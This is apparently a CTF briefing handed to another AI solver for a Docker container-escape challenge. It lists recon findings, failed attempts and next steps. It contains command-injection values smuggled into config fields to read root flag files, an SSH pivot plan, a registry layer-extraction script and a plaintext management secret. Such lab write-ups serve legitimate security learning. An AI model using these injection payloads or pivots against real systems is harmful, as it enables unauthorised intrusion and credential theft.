# STOLEN SCHEMATICS - Complete Challenge Context for AI Solver

## Challenge Details
- **Name:** Stolen Schematics (Docker CTF - Container Escape)
- **Points:** 350
- **Goal:** Escape container, compromise another game server, retrieve flag from `/root/flag.txt` or `/etc/flag.txt`
- **Instance:** `ssh player@instance.ctf.tdho.st -p 32960` (password: `reyalp`)
- **Time Limit:** ~9 minutes per instance

## Challenge Description
> A game server has been compromised using a malicious jar file. To secure access, an SSH server has been installed for remote access. Now the job has been pushed to you: escape the container, compromise another game server and retrieve the flag from a file in their server.
>
> An older build of this server image was **accidentally left public on our ghcr.io registry**, might be worth a look...

## What We Know For Certain

### 1. System Information
- **Current Container IP:** 172.27.0.3
- **Docker Host IP:** 172.27.0.1 (SSH open on port 22 - requires publickey auth)
- **Gateway:** 172.27.0.2
- **Docker Registry:** http://172.27.0.1:5000 (accessible)
- **User:** player (limited privileges)
- **Inside Docker:** Confirmed (/.dockerenv exists)
- **Capabilities:** No special privileges, not a privileged container

### 2. Critical Files & Processes
```
root      16  /bin/bash /opt/mc/scripts/sync-loop.sh (running as ROOT)
root      15  sshd: /usr/sbin/sshd [listener]
```

**sync-loop.sh Details:**
- Path: `/opt/mc/scripts/sync-loop.sh` (741 bytes, rwxr--r--, root owned)
- **Cannot read:** Permission denied for player user
- Appears to monitor `/opt/mc/config/sync-request.conf`
- Creates `/opt/mc/config/sync.trigger` when config detected (0 bytes, just a marker)

### 3. Configuration Files
**Player-writable:** `/opt/mc/config/sync-request.conf`
**Management Secret found:** `dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ` (in `/opt/mc/server.properties`)

### 4. Docker Registry Contents
**Available at:** http://172.27.0.1:5000/v2/_catalog

**Repositories found:**
```json
{
  "repositories": [
    "images/stolen-schematics-game-server-prerelease",
    "images/stolen-schematics-gameserver",
    "images/stolen-schematics-watcher",
    "infra/stolen-schematics",
    "infra/stolen-schematics-diagnostic"
  ]
}
```

**Tags discovered:**
- `images/stolen-schematics-watcher`: tags `['team131-fix', 'v1']`
- `images/stolen-schematics-game-server-prerelease`: tags `['v2.5.39']`

### 5. Bash History Evidence (Previous Attempts)
Found in bash history showing config format attempts:
```bash
# Format 1 (3 parameters):
talldwarf-sync-command=FILE-READ:/etc/flag.txt
talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true
talldwarf-sync-output=/opt/mc/.sync/sync.result

# Format 2 (simplified to 1 parameter):
talldwarf-sync-command=FILE-READ:/etc/flag.txt

# Format 3 (direct command):
talldwarf-sync-command=cat /root/flag.txt
talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true
```

**Output locations checked in history:**
- `/opt/mc/config/sync-result.conf`
- `/home/player/flagcap.txt`
- `/opt/mc/.sync/sync.result`

## What We Tried (All Failed)

### 1. Config File Approach
- Wrote various config formats to `/opt/mc/config/sync-request.conf`
- Script detects config (creates sync.trigger file)
- **BUT:** No output ever appears in expected locations
- Ran loops for 60+ seconds waiting for output

### 2. Docker Registry Extraction
- Successfully accessed registry at 172.27.0.1:5000
- Downloaded and extracted layers from all tags
- **BUT:** sync-loop.sh script NOT found in any extracted layers
- Only found files < 4MB in layer extraction

### 3. SSH Pivot to Docker Host
- Confirmed SSH running on 172.27.0.1
- **BUT:** Requires publickey authentication
- NO SSH keys found anywhere in container:
  - Not in `/home/player/.ssh/`
  - Not in `/opt/mc/`
  - Not in `/tmp/`
  - Not in `/root/` (permission denied anyway)

### 4. Command Injection Attempts
```bash
# Tried in config values:
talldwarf-sync-command=$(cat /root/flag.txt > /tmp/flag.txt)
talldwarf-sync-command=`cat /root/flag.txt > /tmp/flag.txt`
talldwarf-sync-command=; cat /root/flag.txt > /tmp/flag.txt #
```
None produced output or created files.

### 5. Alternative Attack Vectors Explored
- Docker socket: Not accessible (`/var/run/docker.sock` doesn't exist)
- Privileged container checks: Not privileged (cannot access `fdisk -l`)
- Process injection: Cannot access `/proc/16/` (sync-loop.sh process)
- Management secret usage: Tried as SSH password, no success

## The Core Problem

**We cannot determine the correct config format for sync-loop.sh because:**
1. The script itself is unreadable (root only, 741 permissions)
2. Registry extraction doesn't contain the script
3. No other method to read the script exists

**The sync mechanism responds but produces no output:**
- Config file `/opt/mc/config/sync-request.conf` is detected
- Trigger file `/opt/mc/config/sync.trigger` is created (proof of detection)
- BUT no result files appear anywhere

## Possible Solutions To Explore

### Option 1: Extract sync-loop.sh from "Old Public Build"
The challenge description says: *"An older build of this server image was accidentally left public on our ghcr.io registry"*

**We tried:** http://172.27.0.1:5000 (local registry)
**Need to try:** 
- Actual GitHub Container Registry: `ghcr.io`
- Look for public repositories under organization names
- Try accessing WITHOUT authentication to find "accidentally public" image
- Search for tags like: `old`, `public`, `v0.x`, `dev`, `test`, `leak`, etc.

**Example commands to try from Kali:**
```bash
# List all tags for a repository
curl -s https://ghcr.io/v2/<org>/stolen-schematics-watcher/tags/list

# Try common public repo patterns
curl -s https://ghcr.io/v2/tdho-ctf/stolen-schematics-watcher/tags/list
curl -s https://ghcr.io/v2/hackfest/stolen-schematics/tags/list

# Download specific layer if found
curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  https://ghcr.io/v2/<org>/<repo>/manifests/<tag>
```

### Option 2: Generate SSH Keypair and Add to authorized_keys
If we can write to `/home/player/.ssh/authorized_keys`, we could:
```bash
# On Kali
ssh-keygen -t ed25519 -f stolen_key -N ""

# In container
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAAC3... your_pubkey" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Then from Kali
ssh -i stolen_key player@instance.ctf.tdho.st -p 32960 "ssh -i <find_key> player@172.27.0.1 'cat /root/flag.txt'"
```

### Option 3: Brute Force Config Formats
Try all possible parameter combinations:
```bash
# Variations to try:
talldwarf-command=FILE-READ:/root/flag.txt
talldwarf-action=READ-FILE:/root/flag.txt  
talldwarf-file-operation=READ:/root/flag.txt
sync-command=FILE-READ:/root/flag.txt
watcher-command=FILE-READ:/root/flag.txt
```

### Option 4: Check for Management API
The secret `dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ` might be used for:
- HTTP API on Docker host
- Some management interface
- JWT token generation

### Option 5: Exploit Minecraft Server
If Minecraft server is actually running, check for:
- RCON access (check `/opt/mc/server.properties` for `enable-rcon=true`)
- Minecraft vulnerabilities (Log4Shell, etc.)
- Plugin vulnerabilities

## Files to Provide to Another AI

**On the target instance, extract these for analysis:**
```bash
# Server configuration
cat /opt/mc/server.properties

# Any other config files
ls -la /opt/mc/config/
cat /opt/mc/config/* 2>/dev/null

# Check for any documentation
find /opt/mc -name "*.md" -o -name "*.txt" -o -name "README*" 2>/dev/null

# List all scripts
find /opt/mc/scripts -type f 2>/dev/null

# Environment variables
env | sort
```

## Python Script for Registry Full Extraction

```python
import urllib.request
import json
import gzip
import io
import tarfile

REG = "http://172.27.0.1:5000"

def get_url(url, accept="application/vnd.docker.distribution.manifest.v2+json"):
    req = urllib.request.Request(url)
    req.add_header("Accept", accept)
    return urllib.request.urlopen(req, timeout=15)

# Get all repositories
repos = json.load(get_url(f"{REG}/v2/_catalog"))

for repo in repos['repositories']:
    print(f"\n{'='*70}")
    print(f"Repository: {repo}")
    print(f"{'='*70}")
    
    # Get all tags
    tags_data = json.load(get_url(f"{REG}/v2/{repo}/tags/list"))
    
    for tag in tags_data.get('tags', []):
        print(f"\n>>> Tag: {tag}")
        
        manifest = json.load(get_url(f"{REG}/v2/{repo}/manifests/{tag}"))
        
        for layer in manifest.get('layers', []):
            digest = layer['digest']
            size = layer.get('size', 0)
            
            blob_data = get_url(f"{REG}/v2/{repo}/blobs/{digest}", "application/octet-stream").read()
            
            try:
                raw = gzip.decompress(blob_data)
            except:
                raw = blob_data
            
            try:
                tf = tarfile.open(fileobj=io.BytesIO(raw))
                for member in tf.getmembers():
                    if member.isfile() and 'sync' in member.name.lower():
                        content = tf.extractfile(member).read().decode('utf-8', 'replace')
                        print(f"\nFOUND: {member.name}")
                        print(content)
            except:
                pass
```

## Summary for Next AI

**YOU NEED TO:**
1. Find the "accidentally public" Docker image mentioned in challenge description (probably on ghcr.io, not local registry)
2. Extract sync-loop.sh from that public image to learn the correct config format
3. Use that format to write to `/opt/mc/config/sync-request.conf`
4. Read flag from wherever sync-loop.sh outputs it

**OR find an alternative path like:**
- SSH key discovery
- Management API exploitation  
- Different privilege escalation vector

**Time is critical:** Only ~9 minutes per instance!

**Key insight:** The bash history shows this HAS worked before on this same instance type, so the mechanism exists and functions - we just need the correct format or the actual script.
